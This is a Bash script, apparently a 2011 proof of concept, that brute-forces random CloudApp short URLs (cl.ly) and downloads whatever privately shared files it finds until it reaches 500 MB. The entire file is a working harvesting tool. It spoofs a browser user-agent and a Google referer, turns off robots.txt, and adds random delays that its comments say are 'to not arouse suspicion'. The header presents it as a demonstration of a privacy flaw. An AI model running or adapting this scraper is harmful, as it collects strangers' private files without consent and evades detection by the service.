#!/bin/bash
#
###############
# Distributed under the terms of the BSD License.
# Copyright (c) 2011 Phil Cryer phil@philcryer.com
# Source https://github.com/philcryer/ca-harvester
###############
#
# name:		ca-harvester.sh
#
# features:	randomly creates a C l o u d A p p short URL (ie http://cl . ly/xxxx)
#		checks that URL, if it finds content it downloads it
#		renames the file, preserving the url suffix in the filename
#		limits overall size of download in MB (default 100MB)
#
# disclosure:	discussed this vulnerabilityDate: Thu, 1 Dec 2011 23:09:20 -0600
#
# license:	this is open source software released under the Simplified BSD License
#       	http://www.opensource.org/licenses/bsd-license.php
#
# inspiration:	@dcurtis C l o u d A p p  R o u l e t t e;
#		http://cargo.dustincurtis.com.s3.amazonaws.com/c l o u d a p p-roulette.html 
#		C l o u d A p p banned that webapp, but did nothing to for users' privacy,
#		my goal with this project was to prove that. 
#
# ran_quote:	there were more but now drops
#
# contact:	phil at philcryer dot com
#
###############

###############
# limit overall download size in MB 
###############
SIZE_LIMIT="500"

###############
# make a directories to store files 
###############
if [ -d 'files' ]; then
	mv files files.`date +'%Y%m%d.%s'`
	mkdir files
else
	mkdir files
fi

echo "	** CtrollApp starting up!";echo

###############
# define a logfile for stats
###############
LOG="/tmp/ctrollapp.log"
cat /dev/null > ${LOG}

###############
# set initial directory size 
###############
DIR_SIZE="0"

###############
# this one is called THE LOOP
###############
until [ "${DIR_SIZE}" -ge "${SIZE_LIMIT}" ]; do 

        ###############
	# create a random id for beginning of the URL path [1-9]
	###############
	fooid="" 
	MAXSIZE=1
	array1=( 1 2 3 4 5 6 7 8 9 )
	MODNUM=${#array1[*]}
        pwd_len=0
        while [ $pwd_len -lt $MAXSIZE ]
		do
		index=$(($RANDOM%$MODNUM))
	        fooid="${fooid}${array1[$index]}" 
		((pwd_len++)) 
	done

	###############
	# create a random 3 character string for the tail of the URL
	###############
	foostring="" 
	MAXSIZE=3         
	array1=( 1 2 3 4 5 6 7 8 9 0 a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M O P Q R S T U V W X Y Z )                      
	MODNUM=${#array1[*]}
	pwd_len=0
	while [ $pwd_len -lt $MAXSIZE ]
	do 
		index=$(($RANDOM%$MODNUM)) 
		foostring="${foostring}${array1[$index]}" 
		((pwd_len++))
       	done
	ID=${fooid}${foostring}
	echo "	** Will now try http://cl.ly/${ID}";echo

	###############
	# wget the URL
	###############
	if which wget > /dev/null; then 
		wget --user-agent="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)" --tries=2 --recursive --level=2 --max-redirect=2 --referer=www.google.com -R .swf,.js,.ico,.css --continue --no-parent --no-host-directories --reject index.html --cut-dirs=2 -P files --execute robots=off http://cl.ly/${ID} 
		echo "x" >> ${LOG}
	#elsefi which curl > /dev/null; then
	#	curl --user-agent 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)' --retry 2 --max-redirs 2 --output files --referer=www.google.com -O http://cl.ly/${ID}
	#	echo "x" >> ${LOG}
	else
	#	echo "	** You need wget or curl installed - failed"; exit 1
		echo "	** You need wget installed - failed"; exit 1
	fi

	###############
	# check for content 
	###############
	echo; cd files
	if [[ -f "${ID}" ]]; then
		FILENAME=`cat ${ID} | grep "Direct link" | cut -d"\"" -f4 | cut -d"/" -f5` > /dev/null
		FILENAME_STRIPPED=`echo "${FILENAME}" | sed "s/%20/ /g"`
	fi

	###############
	# if we got content, rename the file so the URL's suffix is preserved 
	###############
	if [[ -f "${FILENAME_STRIPPED}" ]]; then
		echo "	** Filename: ${FILENAME_STRIPPED}"
		mv "${FILENAME_STRIPPED}" ${ID}-"${FILENAME_STRIPPED}"
		rm -f ${ID} > /dev/null 2>&1
		cd - > /dev/null
	else
		echo "	** Filename: <null>"
		rm -f ${ID} > /dev/null 2>&1
		cd - > /dev/null
	fi

	###############
	# are we at our size limit?
	###############
	DIR_SIZE=$(du -ms files | awk '{print $1}')
	NUM_FILES=`ls -1 files/ |wc -l`
	SIZE_FILES=`du -h files/ | awk '{print $1}' | tail -n1`
	echo; echo "	** Downloaded: ${NUM_FILES} files, total size ~${SIZE_FILES}"
	
	###############
	# if < SIZE_LIMIT, sleep between 1 and 15 seconds, to not arouse suspicion
	###############
	if [ ! "${DIR_SIZE}" -ge "${SIZE_LIMIT}" ]; then 
		delay=$(($RANDOM % 15))
		echo "	** Sleeping for $delay seconds before the next run"
		sleep $delay
	fi
done

###############
# done, we must have hit the SIZE_LIMIT
###############
echo "	** All done!";echo

###############
# sum things up, give an average of how we did
###############
ATTEMPTS=`cat ${LOG} | grep x | wc -l`
rm ${LOG} > /dev/null 2>&1
HITS=`ls -1 files/ | wc -l`
SUM=`echo "${HITS} / ${ATTEMPTS}" | bc -l`

echo "	** Files found:	${HITS}"
echo "	** Attempts:	${ATTEMPTS}"
echo "	** Average:	`echo ${SUM} | awk '{print substr($0,0,3)}' | cut -d"." -f2`%"; echo

exit 0
